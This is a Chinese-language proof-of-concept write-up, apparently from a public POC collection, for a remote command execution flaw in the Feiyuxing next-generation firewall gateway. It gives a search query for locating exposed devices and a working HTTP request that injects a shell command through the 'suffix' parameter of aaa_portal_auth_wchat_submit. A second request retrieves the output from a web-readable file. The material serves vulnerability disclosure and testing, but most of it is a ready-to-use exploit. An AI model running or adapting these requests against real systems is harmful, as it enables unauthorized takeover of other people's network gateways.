---
fofa: "web.title="
source: "wy876 漏洞文库"
---

# 飞鱼星下一代防火墙安全网关aaa_portal_auth_wchat_submit存在远程命令执行漏洞

# 一、漏洞简介
飞鱼星下一代防火墙安全网关aaa_portal_auth_wchat_submit存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 飞鱼星下一代防火墙安全网关

# 三、资产测绘
+ hunter`web.title="下一代防火墙安全网关"&&web.body="./webui/js/jquerylib/"`
+ 特征


# 四、漏洞复现
```plain
GET /webui/?g=aaa_portal_auth_wchat_submit&suffix=;echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/stc.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: {hostname}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


获取命令执行结果

```plain
GET /sslvpn/stc.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: {hostname}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qc40w8qnkoefmbpx>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
